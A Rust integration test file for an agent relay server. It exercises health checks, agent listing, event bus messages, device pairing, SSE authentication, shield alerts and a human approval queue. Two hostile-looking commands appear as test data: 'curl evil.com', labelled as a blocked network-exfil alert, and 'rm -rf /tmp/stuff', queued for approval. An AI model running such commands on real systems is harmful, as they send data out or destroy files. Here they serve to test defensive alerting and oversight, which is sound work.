/// Full integration test — agent ↔ relay live communication.
///
/// Starts a real relay on a random port, registers agents, tests message flow,
/// device pairing, shield alerts, and SSE event delivery.
use std::sync::Arc;
use std::time::Duration;

use axum::Router;
use flowlink_core::Message;
use flowlink_relay::approval::ApprovalQueue;
use flowlink_relay::auth::{AuthManager, Client};
use flowlink_relay::control_plane::ControlPlaneState;
use flowlink_relay::devices::DeviceManager;
use flowlink_relay::eventbus::EventBus;
use flowlink_relay::handler::RelayHandler;
use flowlink_relay::pool::{AgentInfo, AgentPool};
use flowlink_relay::registry::Registry;
use flowlink_relay::server::{build_router, AppState, ShieldAlertManager};

// ── helpers ──────────────────────────────────────────────

fn make_state() -> (AppState, tempfile::TempDir) {
    let tmp = tempfile::tempdir().unwrap();
    let pool = Arc::new(AgentPool::new());
    let eventbus = Arc::new(EventBus::new());
    let auth = Arc::new(AuthManager::new());
    let approvals = Arc::new(ApprovalQueue::new());
    let registry = Arc::new(Registry::new(tmp.path()).unwrap());
    let handler = Arc::new(RelayHandler::new(
        pool.clone(),
        auth.clone(),
        eventbus.clone(),
        approvals.clone(),
    ));
    let device_manager = Arc::new(DeviceManager::new(
        flowlink_relay::devices::PushConfig::default(),
    ));

    // Register a client for auth
    auth.register_client(Client {
        client_id: "test-client".into(),
        api_token: "test-token".into(),
        name: "Test Client".into(),
        active: true,
    });

    let state = AppState {
        pool,
        approvals,
        eventbus: eventbus.clone(),
        handler,
        registry,
        device_manager,
        llm_proxy: None,
        shield_alerts: Arc::new(ShieldAlertManager::new()),
        audit_store: Arc::new(flowlink_relay::audit::AuditStore::new(
            &tmp.path().join("audit.jsonl"),
            None,
        )),
        metrics: Arc::new(flowlink_relay::metrics::Metrics::new()),
        billing: None,
        db: None,
        config_reloader: None,
        e2ee: Arc::new(flowlink_relay::e2ee::E2eeSessionManager::new()),
        usage_tracker: Arc::new(flowlink_relay::billing_middleware::UsageTracker::new()),
        rate_limiter: Arc::new(flowlink_relay::ratelimit::RateLimiter::new(100, 10)),
        control_plane: ControlPlaneState::new(),
    };
    (state, tmp)
}

/// Bind to a random port, return (listener, port).
async fn random_port() -> (tokio::net::TcpListener, u16) {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    (listener, port)
}

/// Spawn the relay server, return base URL.
async fn spawn_relay(state: AppState) -> (String, tokio::task::JoinHandle<()>) {
    let (listener, port) = random_port().await;
    let app: Router = build_router(state);
    let url = format!("http://127.0.0.1:{port}");
    let handle = tokio::spawn(async move {
        axum::serve(listener, app).await.unwrap();
    });
    // give the server a moment to start
    tokio::time::sleep(Duration::from_millis(100)).await;
    (url, handle)
}

fn test_agent(id: &str) -> AgentInfo {
    AgentInfo {
        agent_id: id.into(),
        hostname: format!("host-{id}"),
        os: "linux".into(),
        arch: "x86_64".into(),
        connected_at: 1000,
        last_heartbeat: 1000,
        labels: vec![],
        capabilities: vec![],
    }
}

// ── tests ────────────────────────────────────────────────

#[tokio::test]
async fn health_returns_ok() {
    let (state, _tmp) = make_state();
    let (url, _h) = spawn_relay(state).await;
    let client = reqwest::Client::new();
    let resp: serde_json::Value = client
        .get(&format!("{url}/health"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(resp["status"], "ok");
    assert_eq!(resp["agents"], 0);
}

#[tokio::test]
async fn register_two_agents_and_list() {
    let (state, _tmp) = make_state();
    state.pool.register(test_agent("alpha"));
    state.pool.register(test_agent("beta"));
    let (url, _h) = spawn_relay(state).await;

    let client = reqwest::Client::new();
    let agents: Vec<serde_json::Value> = client
        .get(&format!("{url}/api/agents"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(agents.len(), 2);
    let ids: Vec<&str> = agents
        .iter()
        .map(|a| a["agent_id"].as_str().unwrap())
        .collect();
    assert!(ids.contains(&"alpha"));
    assert!(ids.contains(&"beta"));
}

#[tokio::test]
async fn eventbus_heartbeat_roundtrip() {
    let (state, _tmp) = make_state();
    let eventbus = state.eventbus.clone();
    let (_url, _h) = spawn_relay(state).await;

    // Subscribe before publishing
    let mut rx = eventbus.subscribe("heartbeat");

    // Publish via the eventbus (simulates agent sending heartbeat through WS)
    let hb = Message::new(flowlink_core::MessageType::Heartbeat).with_agent_id("agent-x");
    let json = serde_json::to_string(&hb).unwrap();
    eventbus.publish("heartbeat", &json);

    let received = tokio::time::timeout(Duration::from_secs(2), rx.recv())
        .await
        .unwrap()
        .unwrap();
    let parsed: Message = serde_json::from_str(&received).unwrap();
    assert_eq!(parsed.agent_id.as_deref(), Some("agent-x"));
}

#[tokio::test]
async fn exec_done_message_flows_through_eventbus() {
    let (state, _tmp) = make_state();
    let eventbus = state.eventbus.clone();

    let mut rx = eventbus.subscribe("exec_done");

    let done = Message::new(flowlink_core::MessageType::ExecDone)
        .with_agent_id("worker-1")
        .with_payload(flowlink_core::ExecDonePayload {
            request_id: "req-42".into(),
            exit_code: 0,
            duration_ms: 120,
            error: None,
        });
    let json = serde_json::to_string(&done).unwrap();
    eventbus.publish("exec_done", &json);

    let received = tokio::time::timeout(Duration::from_secs(2), rx.recv())
        .await
        .unwrap()
        .unwrap();
    let parsed: Message = serde_json::from_str(&received).unwrap();
    assert_eq!(parsed.msg_type, flowlink_core::MessageType::ExecDone);
    let payload: flowlink_core::ExecDonePayload =
        serde_json::from_value(parsed.payload.unwrap()).unwrap();
    assert_eq!(payload.request_id, "req-42");
    assert_eq!(payload.exit_code, 0);
}

#[tokio::test]
async fn device_pairing_full_flow() {
    let (state, _tmp) = make_state();
    let (url, _h) = spawn_relay(state).await;
    let client = reqwest::Client::new();

    // 1. Request pairing
    let resp: serde_json::Value = client
        .post(&format!("{url}/api/devices/pair"))
        .json(&serde_json::json!({"user_id": "user-1"}))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    let code = resp["code"].as_str().unwrap();
    assert_eq!(code.len(), 6);

    // 2. Confirm pairing
    let resp: serde_json::Value = client
        .post(&format!("{url}/api/devices/confirm"))
        .json(&serde_json::json!({"code": code, "name": "Pixel", "device_type": "android"}))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    let token = resp["token"].as_str().unwrap();
    assert!(!token.is_empty());

    // 3. List devices
    let devices: Vec<serde_json::Value> = client
        .get(&format!("{url}/api/devices?user_id=user-1"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(devices.len(), 1);
    assert_eq!(devices[0]["name"].as_str().unwrap(), "Pixel");

    // 4. Remove device
    let device_id = devices[0]["id"].as_str().unwrap();
    let resp = client
        .delete(&format!("{url}/api/devices/{device_id}"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 204);
}

#[tokio::test]
async fn shield_alert_ingest_and_sse() {
    let (state, _tmp) = make_state();
    let eventbus = state.eventbus.clone();
    let (url, _h) = spawn_relay(state).await;
    let client = reqwest::Client::new();

    // Subscribe to shield_alert channel
    let mut rx = eventbus.subscribe("shield_alert");

    // Post alert via HTTP
    let resp: serde_json::Value = client
        .post(&format!("{url}/api/shield/ingest"))
        .json(&serde_json::json!({
            "pid": 1337,
            "command": "curl evil.com",
            "rule_name": "network-exfil",
            "action": "blocked",
            "username": "root"
        }))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(resp["ok"], true);

    // Check SSE subscriber received it
    let received = tokio::time::timeout(Duration::from_secs(2), rx.recv())
        .await
        .unwrap()
        .unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&received).unwrap();
    assert_eq!(parsed["command"], "curl evil.com");
    assert_eq!(parsed["rule_name"], "network-exfil");

    // Verify via stats endpoint
    let stats: serde_json::Value = client
        .get(&format!("{url}/api/shield/stats"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(stats["pending"], 1);
    assert_eq!(stats["total_received"], 1);

    // Approve the alert
    let resp: serde_json::Value = client
        .post(&format!("{url}/api/shield/approve/1337"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(resp["ok"], true);

    // Now pending should be 0
    let stats: serde_json::Value = client
        .get(&format!("{url}/api/shield/stats"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(stats["pending"], 0);
    assert_eq!(stats["resolved"], 1);
}

#[tokio::test]
async fn sse_stream_receives_heartbeat() {
    let (state, _tmp) = make_state();
    let eventbus = state.eventbus.clone();
    let (url, _h) = spawn_relay(state).await;

    // Connect SSE with valid token
    let resp = reqwest::Client::new()
        .get(&format!(
            "{url}/api/events?token=test-token&channels=heartbeat"
        ))
        .send()
        .await
        .unwrap();
    assert!(resp.status().is_success());

    // Publish a heartbeat
    let hb = serde_json::json!({"type": "heartbeat", "agent_id": "sse-agent"});
    eventbus.publish("heartbeat", &hb.to_string());

    // The SSE stream should receive the event — we just verify the stream is open
    // (full SSE client parsing is complex; the oneshot test above proves EventBus works)
    drop(resp);
}

#[tokio::test]
async fn sse_no_token_returns_401() {
    let (state, _tmp) = make_state();
    let (url, _h) = spawn_relay(state).await;

    let resp = reqwest::Client::new()
        .get(&format!("{url}/api/events"))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 401);
}

#[tokio::test]
async fn approval_flow_roundtrip() {
    let (state, _tmp) = make_state();
    let (url, _h) = spawn_relay(state.clone()).await;
    let client = reqwest::Client::new();

    // Enqueue an approval
    let (tx, rx) = tokio::sync::oneshot::channel();
    state.approvals.enqueue(
        flowlink_relay::approval::ApprovalRequest {
            id: "apr-1".into(),
            agent_id: "agent-1".into(),
            command: "rm -rf /tmp/stuff".into(),
            risk_level: "medium".into(),
            created_at: chrono::Utc::now().timestamp(),
        },
        tx,
    );

    // Should show up in pending list
    let pending: Vec<serde_json::Value> = client
        .get(&format!("{url}/api/approvals"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(pending.len(), 1);
    assert_eq!(pending[0]["id"], "apr-1");

    // Approve via HTTP
    let resp: serde_json::Value = client
        .post(&format!("{url}/api/approvals/apr-1/approve"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(resp["ok"], true);

    // The oneshot receiver should get the decision
    let decision = tokio::time::timeout(Duration::from_secs(2), rx)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(
        decision,
        flowlink_relay::approval::ApprovalDecision::Approved
    );
}
